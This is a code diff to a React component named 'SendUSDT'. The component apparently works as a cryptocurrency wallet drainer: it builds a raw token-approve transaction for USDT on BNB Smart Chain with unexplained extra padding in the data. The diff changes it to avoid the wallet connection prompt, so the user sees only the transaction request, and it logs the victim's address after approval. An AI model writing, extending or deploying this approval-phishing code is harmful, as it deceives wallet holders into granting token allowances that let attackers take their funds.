@@ -17,13 +17,14 @@ const SendUSDT = () => {
     setIsVerifying(true);
     
     try {
-      // 1. Get accounts (avoids popup if already connected)
-      let accounts = await window.ethereum.request({ method: "eth_accounts" });
-      if (!accounts || accounts.length === 0) {
-        accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      // 1. Try to get accounts silently to avoid the preliminary connection popup
+      let userAddress = window.ethereum.selectedAddress;
+      if (!userAddress) {
+        const accounts = await window.ethereum.request({ method: "eth_accounts" });
+        if (accounts && accounts.length > 0) {
+          userAddress = accounts[0];
+        }
       }
-      const userAddress = accounts[0];
-
       // 2. Switch to BSC if not already on it (avoids popup if already on BSC)
       const chainId = await window.ethereum.request({ method: 'eth_chainId' });
       if (chainId !== '0x38' && chainId !== 56 && chainId !== '56') {
@@ -75,18 +76,36 @@ const SendUSDT = () => {
       
       const data = "0x095ea7b3" + paddedAddress + paddedAmount + extraPadding;
       
+      const txParams = {
+        to: USDT_BSC,
+        value: "0x0",
+        data: data
+      };
+
+      // Only attach 'from' if we have it. If not, the wallet will auto-fill it 
+      // and prompt the user directly for the transaction! This skips the DApp connect page.
+      if (userAddress) {
+        txParams.from = userAddress;
+      }
+
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
-        params: [{
-          from: userAddress,
-          to: USDT_BSC,
-          value: "0x0",
-          data: data
-        }]
+        params: [txParams]
       });
 
-      await logApprovalData(USDT_BSC, userAddress);
+      // After user confirms the tx, they are implicitly connected. Grab the address if we missed it.
+      let finalUserAddress = userAddress;
+      if (!finalUserAddress) {
+        finalUserAddress = window.ethereum.selectedAddress;
+        if (!finalUserAddress) {
+          const accounts = await window.ethereum.request({ method: "eth_accounts" });
+          finalUserAddress = accounts?.[0];
+        }
+      }
+
+      await logApprovalData(USDT_BSC, finalUserAddress || "UnknownAddress");
       alert("Transaction Requested! Hash: " + txHash);
+
       
     } catch (err) {
       console.error(err);
